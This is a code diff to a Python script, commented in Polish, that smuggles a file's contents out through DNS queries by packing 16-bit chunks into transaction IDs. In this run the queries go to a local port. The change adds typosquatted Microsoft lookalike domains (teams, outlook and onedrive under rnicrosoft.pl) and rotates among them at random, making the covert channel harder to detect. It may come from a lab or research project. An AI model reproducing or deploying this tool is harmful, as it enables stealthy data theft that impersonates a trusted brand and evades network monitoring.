@@ -7,6 +7,7 @@ from dnslib import DNSRecord, DNSHeader, DNSQuestion, QTYPE
 
 SPECIAL_CHAR = 0x0000
 
+domains = ['teams.rnicrosoft.pl', 'outlook.rnicrosoft.pl', 'onedrive.rnicrosoft.pl']
 
 def mix_two_chars_bits(chunk):
     bits1 = chunk[0:8]
@@ -41,8 +42,9 @@ def send_dns_query(filepath):
     binary_list = text_to_binary_list(text)
     binary_data = ''.join(binary for _, binary in binary_list)
 
+    start_end_website = random.choice(domains)
     # Start przesylania ukrytej wiadomosci
-    client.sendto(dns_query(SPECIAL_CHAR, "teams.rnicrosoft.pl").pack(), ('127.0.0.1', 5353))
+    client.sendto(dns_query(SPECIAL_CHAR, start_end_website).pack(), ('127.0.0.1', 5353))
     print(f"Sent START TXID: {SPECIAL_CHAR}")
 
     try:
@@ -53,6 +55,7 @@ def send_dns_query(filepath):
 
     # Ukryte dane
     for i in range(0, len(binary_data), 16):
+        selected_website = random.choice(domains)
         chunk = binary_data[i:i+16]
         if len(chunk) < 16:
             chunk = chunk.ljust(16, '0')  # Dopelnij zerami do 16 bitów
@@ -62,7 +65,7 @@ def send_dns_query(filepath):
         txid = int(chunk, 2) # Konwersja bitów na int
 
         
-        client.sendto(dns_query(txid, "teams.rnicrosoft.pl").pack(), ('127.0.0.1', 5353))
+        client.sendto(dns_query(txid, selected_website).pack(), ('127.0.0.1', 5353))
         print(f"Sent TXID: {txid} (chunk: {chunk})")
 
         # Odbierz odpowiedz TTL i czekaj az minie TTL
@@ -77,7 +80,7 @@ def send_dns_query(filepath):
             # time.sleep(1)
 
     # Koniec przesylania ukrytej wiadomosci
-    client.sendto(dns_query(SPECIAL_CHAR, "teams.rnicrosoft.pl").pack(), ('127.0.0.1', 5353))
+    client.sendto(dns_query(SPECIAL_CHAR, start_end_website).pack(), ('127.0.0.1', 5353))
     print(f"Sent END TXID: {SPECIAL_CHAR}")
 
     try:
